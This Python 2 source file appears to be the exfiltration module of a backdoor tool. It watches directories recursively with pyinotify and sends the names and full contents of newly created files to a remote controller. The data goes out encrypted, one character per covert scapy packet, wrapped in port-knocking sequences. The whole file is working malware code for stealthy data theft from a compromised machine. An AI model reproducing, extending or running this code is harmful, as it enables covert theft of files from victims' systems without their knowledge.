import pyinotify
import socket
from subprocess import Popen, PIPE
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from struct import *
import sys
import os
import threading
import pcapy
import config
import recvFunctions
import backjake
import utils
import exfil

client = ""
string = ""
protocol = ""

class EventHandler(pyinotify.ProcessEvent):
	def process_IN_CREATE(self, event):
		global string
		isFile = os.path.isfile(event.pathname)
		if isFile:
			string = "Created file: " + event.pathname + " Contents: "
		else:
			string = "Created Directory: " + event.pathname
		sendMessage(string)
		string = ""

		if isFile:
			sendFile(event.pathname)

	def process_IN_DELETE(self, event):
		global string
		sendMessage(string)
		string = "Deleted: " + event.pathname

mask = pyinotify.IN_DELETE | pyinotify.IN_CREATE
handler = EventHandler()
wama = pyinotify.WatchManager()
noti = pyinotify.Notifier(wama, handler)	

def addWatch(target, address, proto):
	global client, protocol
	client = address
	protocol = proto

	if (wama.add_watch(target, mask, rec=True) > 0):
		print "added: " + target

def sendMessage(string):
	recvFunctions.knockCode(client, protocol, True)

	string = utils.encryptData(string)
	for c in string:
		send(utils.covertPacket(client, protocol, c, recvFunctions.pswd), verbose=0)
	send(utils.covertPacket(client, protocol, '\n', recvFunctions.pswd), verbose=0)

	recvFunctions.knockCode(client, protocol, False)

def removeWatch(target):
	if (wama.rm_watch(wama.get_wd(target))):
		print "removed: " + target

def sendFile(target):
	recvFunctions.knockCode(client, protocol, True)

	send(utils.covertPacket(client, protocol, '\n', recvFunctions.pswd), verbose=0)
	with open(target, 'r') as f:
		while True:
			c = f.read(1)
			if not c:
				break
			c = utils.encryptData(c)
			send(utils.covertPacket(client, protocol, c, recvFunctions.pswd), verbose=0)

	recvFunctions.knockCode(client, protocol, False)

def exfilThread():
	noti.loop()

def startThread(): # address, protocol, password):
	listenThread = threading.Thread(target=exfilThread)#, args=(address, protocol))
	listenThread.daemon = True
	listenThread.start()